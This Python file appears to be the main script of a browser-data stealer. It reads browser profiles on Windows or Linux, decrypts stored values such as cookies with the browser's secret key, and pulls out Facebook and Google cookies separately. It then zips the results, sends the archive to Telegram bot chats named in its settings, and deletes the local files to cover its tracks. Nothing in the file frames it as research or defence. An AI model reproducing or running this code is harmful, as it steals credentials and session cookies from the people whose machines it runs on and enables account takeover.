import asyncio
import logging
import os
import sys
from typing import Any, Callable, Dict, List

from config.settings import settings
from models.bot_model import ListBot
from models.browser import Browser
from models.data import Data
from models.decrypt import Decrypt
from models.platform import Platform
from models.profile import Profile
from models.secret_key import Key
from utils.file import remove_files_and_folders
from utils.helpers import compress_folders_and_files


def process_data(
    data_settings: Dict[str, Any],
    profile: Profile,
    decrypt_method: Callable[[Any, bytes], str],
    secret_key: bytes,
    browser_name: str,
) -> None:
    data_name = data_settings["data_name"]
    logging.info("Processing data for %s", data_name)
    data_file = data_settings["data_info"]["data_file"]
    data_path = os.path.join(profile.profile_path, data_file)
    data_table_name = data_settings["data_info"]["data_table_name"]
    profile_data = Data(data_name, data_path, data_table_name)
    profile.create_data(profile_data)
    profile_data.load_data()

    for encrypted_settings in data_settings["encrypted"]:
        profile_data.decrypt_column_data(
            encrypted_column=encrypted_settings["encrypted_column"],
            saved_column=encrypted_settings["saved_column"],
            decrypt_method=decrypt_method,
            key=secret_key,
        )

    profile_data.filter_data(
        columns=data_settings["filter_columns"], ignored_types=["bytes"]
    )

    Data.save_data_as_json(
        profile_data.data,
        f"temp/json/{browser_name}/{profile.profile_name}/{data_name}.json",
    )
    Data.save_data_as_csv(
        profile_data.data,
        f"temp/csv/{browser_name}/{profile.profile_name}/{data_name}.csv",
    )
    if data_name == "cookies":
        hosts = ["facebook", "google"]

        for host in hosts:
            filter_cookies_data = profile_data.filter_cookies_data(host)
            Data.save_data_as_json(
                filter_cookies_data,
                f"temp/json/{browser_name}/{profile.profile_name}/{data_name}_{host}.json",
            )
            Data.save_data_as_csv(
                filter_cookies_data,
                f"temp/csv/{browser_name}/{profile.profile_name}/{data_name}_{host}.csv",
            )


def process_profile(
    profile: Profile,
    browser_info: Dict[str, Any],
    decrypt_method: Callable[[Any, bytes], str],
    key: Key,
    browser_name: str,
) -> None:
    logging.info("Processing profile for %s", browser_name)
    for data_settings in browser_info["data"]:
        if browser_name == "firefox":
            secret_key = key.get_key(profile_path=profile.profile_path)
        else:
            secret_key = key.get_key()
        process_data(data_settings, profile, decrypt_method, secret_key, browser_name)


def process_path(
    browser_path: str,
    browser_name: str,
    platform: Platform,
    browser_info: Dict[str, Any],
    platform_name: str,
) -> None:
    logging.info("Processing path for browser %s", browser_name)
    browser = Browser(browser_name, browser_path)
    platform.create_browser(browser)
    browser.load_profiles(browser_info["default_profiles"])

    decrypt = Decrypt(platform_name, browser_name)
    key = Key(platform_name, browser_name)

    decrypt_method = decrypt.decrypt_value

    for profile in browser.profiles:
        process_profile(profile, browser_info, decrypt_method, key, browser_name)


def process_browser(
    browser_settings: Dict[str, Any], platform_name: str, platform: Platform
) -> None:
    browser_name = browser_settings["browser_name"]
    logging.info("Processing browser %s", browser_name)
    browser_info = browser_settings["browser_info"]

    for browser_path in browser_info["default_paths"]:
        process_path(browser_path, browser_name, platform, browser_info, platform_name)


def process_platform(platform_name: str) -> None:
    logging.info("Processing platform %s", platform_name)
    platform = Platform(platform_name)
    platform_settings = settings[platform_name]

    for browser_settings in platform_settings["browser"]:
        process_browser(browser_settings, platform_name, platform)


if __name__ == "__main__":
    logging.info("Starting main process...")
    process_platform("windows" if sys.platform == "win32" else "ubuntu")

    directories: List[str] = ["temp/"]
    zip_file: str = "data.zip"
    compress_folders_and_files(directories=directories, zip_file=zip_file)

    documents: List[str] = ["data.zip"]
    list_bot_settings: List[Dict[str, str]] = settings["tele"]["list_bot"]

    list_bot = ListBot()

    for bot_settings in list_bot_settings:
        list_bot.create_bot(bot_settings["BOT_TOKEN"], bot_settings["CHAT_ID"])

    asyncio.run(list_bot.send_information(documents=documents))

    remove_files_and_folders(paths=["temp", "data.zip"])
    logging.info("Main process completed.")
